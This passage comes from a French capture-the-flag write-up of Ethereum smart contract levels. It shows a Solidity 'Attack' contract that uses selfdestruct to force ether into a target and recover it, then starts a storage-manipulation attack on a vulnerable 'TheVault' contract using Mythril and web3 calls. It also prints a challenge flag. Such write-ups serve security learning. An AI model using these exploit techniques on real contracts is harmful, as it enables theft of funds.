&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dateOfCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectFundsDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;getStockExchangeAmount()&lt;/code&gt;et &lt;code class=&quot;highlighter-rouge&quot;&gt;dateOfCollection()&lt;/code&gt;sont des accesseurs.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;constant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ABI&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x93202aaa272f2eBd6DEC0e32864f943C4A7d3CF0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse d'instance&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getStockExchangeAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dateOfCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2838556020&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;attack-3&quot;&gt;Attack&lt;/h2&gt;

&lt;p&gt;Ici, l’attaque à mettre en place est &lt;code class=&quot;highlighter-rouge&quot;&gt;selfdestruct()&lt;/code&gt;, qui va nous permettre de récupérer les ethers du smart contract.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148&quot;&gt;Self Destruct / Suicide&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://medium.com/coinmonks/smart-contract-exploits-part-2-featuring-capture-the-ether-math-31a289da0427&quot;&gt;Retirement Fund&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://solidity.readthedocs.io/en/v0.4.24/contracts.html#fallback-function&quot;&gt;Fallback function&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Attack&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ether&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;selfdestruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f7b35Bcf2f96F4EECF7121A8d4d6CE4E74497eC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On va passer en paramètre de &lt;code class=&quot;highlighter-rouge&quot;&gt;selfdestruct()&lt;/code&gt;, l’adresse du smart contract.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;receiveMoneyAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut alors récupérer les fonds en appelant le fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;receiveMoneyAmount()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On demande alors la flag.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SANTA{¡¡0v3rFl0ws_4r3_Ins4N3!!}&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;level-5---thevault&quot;&gt;Level 5 - TheVault&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 500&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TheVault&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;moneyAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;moneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;putMoneyOnAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;moneyQuantity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;moneyQuantity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawMoneyFromAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;moneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getMoneyFromAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notre objectif dans ce code est d’exécuter la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawMoneyFromAccount()&lt;/code&gt;. Le problème est que le &lt;code class=&quot;highlighter-rouge&quot;&gt;require()&lt;/code&gt; qui se trouve à l’intérieur nous oblige à avoir &lt;code class=&quot;highlighter-rouge&quot;&gt;moneyAmount &amp;gt;= 2000000&lt;/code&gt;, alors que &lt;code class=&quot;highlighter-rouge&quot;&gt;moneyAmount&lt;/code&gt; n’est jamais modifié, il vaut par défaut &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;comment-fonctionne-lallocation-de-la-mémoire-dans-les-smart-constracts-&quot;&gt;Comment fonctionne l’allocation de la mémoire dans les smart constracts ?&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/&quot;&gt;Ethereum Smart Contract Storage&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Le tableau &lt;code class=&quot;highlighter-rouge&quot;&gt;savingAccounts&lt;/code&gt;stock sa taille dans le slot 1.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;myth read-storage &lt;span class=&quot;nt&quot;&gt;--rpc&lt;/span&gt; infura-ropsten 1 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
1: 0x0000000000000000000000000000000000000000000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/ConsenSys/mythril&quot;&gt;Mythril&lt;/a&gt;&lt;/p&gt;

  &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usage: &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;myth read-storage &lt;span class=&quot;nt&quot;&gt;--rpc&lt;/span&gt; infura-ropsten slot_number contract_addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pour le moment, le table est vide. Essayons d’ajouter un élément avec la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;putMoneyOnAccount()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;constant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ABI&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse d'instance&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// compte vide&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMoneyFromAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// on ajoute une quantité de 0x16 à savingAccounts[0x123]&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;putMoneyOnAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x16&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// on retrouve ce que l'on a ajouté&lt;/span&gt;
